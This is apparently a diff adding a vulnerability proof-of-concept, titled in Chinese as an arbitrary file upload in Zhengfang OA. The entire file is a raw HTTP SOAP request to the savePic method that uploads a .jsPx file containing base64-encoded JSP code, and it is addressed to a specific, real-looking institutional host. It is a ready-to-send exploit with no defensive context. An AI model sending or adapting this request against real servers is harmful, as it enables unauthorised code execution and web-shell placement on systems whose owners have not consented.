@@ -1,0 +1,22 @@
+# 正方OA任意文件上传
+POST /zfca/axis/RzptManage HTTP/1.1
+Host: sso.hnwmxy.com:81
+Content-Type: text/xml;charset=UTF-8
+User-Agent: Mozilla/5.0 (Linux; U; Android 13.0; en-us; Xoom Build/HRI39) AppleWebKit/525.10 (KHTML, like Gecko) Version/3.0.4 Mobile Safari/523.12.2
+Accept-Encoding: gzip, deflate
+SOAPAction:
+Cache-Control: no-cache
+Pragma: no-cache
+Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
+Connection: close
+Content-Length: 677
+
+<soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:pub="http://pubService.webServices.zfca.zfsoft.com">
+<soapenv:Header/>
+<soapenv:Body>
+<pub:savePic soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
+<filepath xsi:type="soapenc:string" xmlns:soapenc="http://schemas.xmlsoap.org/soap/encoding/">2342423456345603djeu943.jsPx</filepath>
+<bytes xsi:type="soapenc:base64Binary" xmlns:soapenc="http://schemas.xmlsoap.org/soap/encoding/">PCUgIG91dC5wcmludCgiMTIzIik7ICU+</bytes>
+</pub:savePic>
+</soapenv:Body>
+</soapenv:Envelope>
